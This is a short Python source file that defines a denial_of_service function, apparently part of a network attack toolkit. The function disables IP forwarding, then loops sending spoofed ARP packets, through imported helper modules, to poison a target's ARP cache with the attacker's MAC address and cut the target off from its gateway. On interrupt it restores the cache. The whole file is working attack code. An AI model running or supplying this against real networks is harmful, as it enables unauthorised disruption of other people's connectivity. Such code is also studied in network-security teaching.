
from getmac import get_mac_address as gma
from modules.disable_ip_forwarding import *
from modules.spoof_arp_cache import *
from modules.restore_arp_cache import *

def denial_of_service(target_ip_addr, gateway_ip_addr):
	disable_ip_forwarding()
	spoof_mac_addr = gma()
	try:
		while True:
			spoof_arp_cache(target_ip_addr, gateway_ip_addr, spoof_mac_addr)
			print("Sent ARP Packets")
			time.sleep(2)
	except KeyboardInterrupt:
		print("Restoring ARP Cache")
		restore_arp_cache(target_ip_addr, gateway_ip_addr)
		return